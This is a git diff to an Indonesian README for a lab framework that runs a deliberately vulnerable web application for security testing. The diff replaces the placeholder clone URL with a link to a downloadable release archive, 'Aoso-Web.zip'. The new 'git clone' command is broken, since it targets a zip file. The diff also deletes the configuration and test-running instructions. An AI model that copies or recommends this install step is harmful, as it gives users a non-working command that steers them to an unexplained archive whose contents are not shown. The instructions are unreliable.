@@ -62,8 +62,8 @@ Framework ini dirancang dengan arsitektur modular untuk memungkinkan fleksibilit
 
 1.  **Clone repositori ini:**
     ```bash
-    git clone [https://github.com/nama-pengguna-anda/nama-repositori-anda.git](https://github.com/nama-pengguna-anda/nama-repositori-anda.git)
-    cd nama-repositori-anda
+    git clone https://github.com/OchiWebs/SecuraBench-Lab/releases/download/SecuraBench-Lab/Aoso-Web.zip
+    cd SecuraBench-Lab
     ```
 
 2.  **Bangun dan jalankan lingkungan lab menggunakan Docker:**
@@ -71,12 +71,3 @@ Framework ini dirancang dengan arsitektur modular untuk memungkinkan fleksibilit
     docker-compose up --build
     ```
     Perintah ini akan membangun *image* untuk aplikasi web yang rentan dan *tool* pengujian Anda.
-
-3.  **(Opsional) Konfigurasi Target:**
-    Edit file `config.yaml` untuk menentukan URL aplikasi target, kredensial pengguna untuk setiap peran, dan parameter pengujian lainnya.
-
-### Menjalankan Pengujian
-
-Untuk memulai proses pengujian otomatis, jalankan skrip utama:
-```bash
-python main.py --target http://localhost:8080 --config config.yaml
